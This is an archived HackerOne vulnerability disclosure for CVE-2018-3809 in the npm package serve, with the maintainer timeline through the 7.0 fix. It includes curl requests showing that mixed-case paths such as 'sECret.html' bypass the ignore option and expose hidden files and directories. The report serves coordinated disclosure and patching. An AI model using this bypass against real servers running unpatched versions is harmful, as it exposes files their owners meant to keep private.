---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/information-exposure-through-directory-listing
  - env/web
  - stack/node
substate: "resolved"
weakness: "Information Exposure Through Directory Listing"
enriched: true
body: true
date: 2018-05-31
submitted: 2018-03-28T06:51:07.059Z
bounty_usd: null
votes: 5
cve: "CVE-2018-3809"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "tungpun"
source: "https://hackerone.com/reports/330650"
title: "[serve] Directory listing and File access even when they have been set to be ignored"
---
# [serve] Directory listing and File access even when they have been set to be ignored

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Node.js third-party modules | **Disclosed:** 2018-05-31

- Report: [https://hackerone.com/reports/330650](https://hackerone.com/reports/330650)
- CWE: Information Exposure Through Directory Listing | CVE: CVE-2018-3809
- Submitted: 2018-03-28T06:51:07.059Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a vulnerability in **serve** on macOS.
It allows listing directory and reading local files on the target server.

# Module

**module name:** serve
**version:** 6.5.3
**npm page:** `https://www.npmjs.com/package/serve`

## Module Description

Ever wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.

In addition, it's also awesome when it comes to serving static sites!

# Vulnerability

## Steps To Reproduce:

*On macOS:*

* Install **serve**:

`$ npm i serve`

* Create an application that uses **serve** for file serving listing and set a few folders and files in the `ignore` config.

```
const serve = require('serve')
const server = serve(__dirname, {
      port: 6060,
      ignore: ['sec', 'secret.html']
})
```

* Run the app

`$ node app.js`

* Now, the current directory will be served by this module on port `6060` with the exception of folder `sec` and file `secret.html`

* If we try to request these ignored files/directories, we get a `Not Found` error

```
$ curl --path-as-is 'http://127.0.0.1:6060/secret.html'
Not Found
```
or if we replace `e` character with URI encoded form `%65`, it still be ignored:

```
$ curl --path-as-is 'http://127.0.0.1:6060/s%65cret.html'
Not Found
```

* However, I found a way to access that file by using uppercase format.

```
$ curl --path-as-is 'http://127.0.0.1:6060/sECret.html'
This is secret content!!
```

To list an *ignored* directory:

`http://127.0.0.1:6060/sEc`

{F279417}

## Supporting Material/References:

* macOS High Sierra 10.13.3
* node v8.10.0
* npm 5.6.0
* Chrome Version 65.0.3325.162 (Official Build) (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **External User Joined**
- **2018-04-08** @lirantal: Hi @tungpun,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Report Triaged**
- **2018-04-24** @lirantal: @notquiteleo can you help us with more information about the issue?
- **2018-05-11** @lirantal: Pinged Zeit on twitter too trying to reach out to them.
- **2018-05-20** @lirantal: @tungpun no response yet from the maintainers.
can you check if a recent version is fixed or still has this issue?
- **2018-05-21** @tungpun: I did a check on the latest version of **serve** (6.5.7), and saw that the issue still exists.
- **2018-05-21** @lirantal: Ok, I reached out once more. Hopefully we'll get someone to join soon.
- **2018-05-21** @tungpun: @lirantal Yes. Thanks for your help!
- **2018-05-27** @lirantal: @tungpun I received an update from the Zeit team that they are going to release a new serve version which will address this. Since this is a very high visibility module I wouldn't want to disclose without a patch or new version released.

There was a release 5 days ago, can you confirm if that includes the fix for this issue?
- **2018-05-28** @tungpun: @lirantal Thanks for your update. I updated to version `serve@6.5.8` and tried to reproduce the issue again and see that the proposed issue still exists.
- **2018-05-28** @lirantal: Alright. This is the same communication update that we have on https://hackerone.com/bugs?report_id=330724 so we're waiting on a new serve release this week and can re-test then.
- **2018-05-28** @notquiteleo: 7.0.0 and 7.0.1 are out!

https://github.com/zeit/serve
- **2018-05-29** @tungpun: It should be okay now. I can't reproduce the issue anymore.
- **2018-05-29** @lirantal: Great.

I'll release a full public disclosure by the weekend to give some time now for new clients to update to the newer version with the fix.
- **2018-05-29** @tungpun: @lirantal No problem. Thanks for your kind cooperation.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **Report Severity Updated**
